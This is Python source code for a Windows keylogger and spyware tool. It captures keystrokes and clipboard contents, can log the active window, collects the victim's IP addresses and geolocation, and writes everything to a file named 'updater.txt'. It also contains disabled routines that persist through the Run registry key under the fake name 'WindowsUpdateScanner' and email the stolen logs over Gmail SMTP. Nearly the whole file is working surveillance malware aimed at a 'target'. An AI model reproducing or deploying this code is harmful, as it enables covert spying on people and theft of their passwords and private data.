import subprocess
import time
# import win32gui
import getpass
import requests
import socket
import json
import smtplib
import threading
import sys
import os
import shutil
from tkinter import TclError, Tk
from typing import final
from pynput import keyboard
from requests.models import Response
from requests.sessions import PreparedRequest
from datetime import date
from urllib.request import urlopen
from subprocess import check_output
from subprocess import DEVNULL
from subprocess import call

file_path = sys.argv[0]
file_name = __file__.split('\\')[-1]
#my_email = " "
#my_password = " "

window_log = []
keys_pressed = []
current_window_logs = []
clipboard_log = []
all_clips = []




def add_to_start():
    os.system(
        f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdateScanner /t REG_SZ /d {file_path} /f"')  # This command will add this file to the startup registry. It will be disguised with the name WindowsUpdateScanner


def subprocess_commands():
    threading.Thread(target=add_to_start).start()
    os.system("pip install requests")  # installing modules
    os.system("pip install pynput")
    os.system("pip install pywin32")
    # I made this a thread because if this already exists in the startup, it will ask you for an input to override it. The user ovsiously can't answer the input.


# subprocess_commands()


def log_window():
    try:
        the_current_window = str(win32gui.GetWindowText(
            win32gui.GetForegroundWindow()))
        if the_current_window == current_window_logs[-1] or the_current_window == "":
            pass
        else:
            current_window = win32gui.GetWindowText(
                win32gui.GetForegroundWindow())
            current_window_logs.append(str(current_window))
            username = getpass.getuser()
            today = date.today()
            current_date = today.strftime('%m/%d/%y')
            current_time = time.strftime("%I:%M:%S %p")
            date_and_window = f'On {current_date} at {current_time}, the user "{username}", was at "{current_window}"'

            window_log.append(date_and_window)
    except IndexError:
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        current_window_logs.append(str(current_window))
        username = getpass.getuser()
        today = date.today()
        current_date = today.strftime('%m/%d/%y')
        current_time = time.strftime("%I:%M:%S %p")
        date_and_window = f'On {current_date} at {current_time}, the user "{username}", was at "{current_window}"'
        window_log.append(date_and_window)


def clipboard_logger():
    global all_clips
    try:
        try:
            clipboard_data = Tk().clipboard_get()
        except TclError:
            clipboard_data = ''
            # This means that nothing is copied to their clipboard

        # print(
        #     f'clip data: {clipboard_data}\n\nall clips -2: {all_clips[-1]}')
        if clipboard_data == all_clips[-1]:
            pass
        else:
            username = getpass.getuser()
            today = date.today()
            current_date = today.strftime('%m/%d/%y')
            current_time = time.strftime("%I:%M:%S %p")
            date_and_clip = f'On {current_date} at {current_time}, the user "{username}", copied: {clipboard_data}"'
            clipboard_log.append(date_and_clip)
        all_clips.append(clipboard_data)
    except IndexError:
        all_clips.append(clipboard_data)
    except TclError:
        pass


def keylogger():
    def check_keys():
        # The amount of seconds it takes to check the amount of keys pressed
        time_to_check_keys = 5
        # The amount of keys that need to be pressed to send the email
        amount_of_keys_to_be_pressed = 20

        time.sleep(time_to_check_keys)
        key_count_checker = []
        for i in keys_pressed:
            key_count_checker.append('s')
        if len(key_count_checker) < amount_of_keys_to_be_pressed:
            pass
        else:
            finish_and_write_info()

    def thread_to_start_check_keys():
        while True:
            time.sleep(.5)
            check_keys()

    def thread_for_window_logger():
        while True:
            time.sleep(.5)
            # log_window()

    def thread_for_clip_logger():
        while True:
            time.sleep(.5)
            clipboard_logger()

    def listen():
        def on_press(key):
            global keys_pressed

            try:
                if 'Key.' in str(key.char):
                    sub = str(key.char).split('Key.')[1]
                    if sub != 'space':
                        keys_pressed.append(f' [{sub}] ')
                    else:
                        keys_pressed.append(f' ')
                else:
                    keys_pressed.append(str(key.char))
            except AttributeError:
                if 'Key.' in str(key):
                    sub = str(key).split('Key.')[1]
                    if sub != 'space':
                        keys_pressed.append(f' [{sub}] ')
                    else:
                        keys_pressed.append(f' ')
                else:
                    keys_pressed.append(str(key))
        with keyboard.Listener(
                on_press=on_press) as listener:
            listener.join()

    threading.Thread(target=thread_to_start_check_keys).start()
    threading.Thread(target=thread_for_window_logger).start()
    threading.Thread(target=thread_for_clip_logger).start()
    listen()


def finish_and_write_info():
    global clipboard_log
    def get_target_info():
        global final_target_info
        global window_log
        global keys_pressed

        public_ip = requests.get('https://api.ipify.org').text
        private_ip = socket.gethostbyname(socket.gethostname())

        def get_location():
            url = 'http://ipinfo.io/json'
            response = urlopen(url)
            data = json.load(response)

            ip = data['ip']
            provider = data['org']
            city = data['city']
            country = data['country']
            state = data['region']
            location = f'Country: {country}\nState: {state}\nCity: {city}\nProvider: {provider}'

            return location

        # window_log_to_send = '\n'.join(window_log)
        keys_pressed_to_send = ''.join(keys_pressed)
        clipboard_log_to_send = '\n'.join(clipboard_log)
        # final_target_info = f'\n\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\n\n{get_location()}\n\nWindow Log:\n{window_log_to_send}\n\nClipboard Log:\n{clipboard_log_to_send}\n\nKeys pressed: {keys_pressed_to_send}'
        final_target_info = f'\n\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\n\n{get_location()}\n\nClipboard Log:\n{clipboard_log_to_send}\n\nKeys pressed: {keys_pressed_to_send}'
        keys_pressed_to_send = ''
        # window_log_to_send = ''

    def compile_and_finish_and_write_info():
        global window_log
        global keys_pressed
        global clipboard_log
        global all_clips

        email_message = final_target_info
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        email = my_email
        password = my_password
        server.login(email, password)
        server.sendmail(email, email, str(
            email_message).encode("ascii", "ignore"))
        window_log = []
        keys_pressed = []
        clipboard_log = []
        all_clips = []
    get_target_info()
    print(final_target_info)
    with open(f"C:\\Users\\${getpass.getuser()}\\updater.txt", "a") as file:
        file.write(f"\n${final_target_info}")
        file.close()

    window_log = []
    keys_pressed = []
    clipboard_log = []
    all_clips = []
    # compile_and_finish_and_write_info()


keylogger()
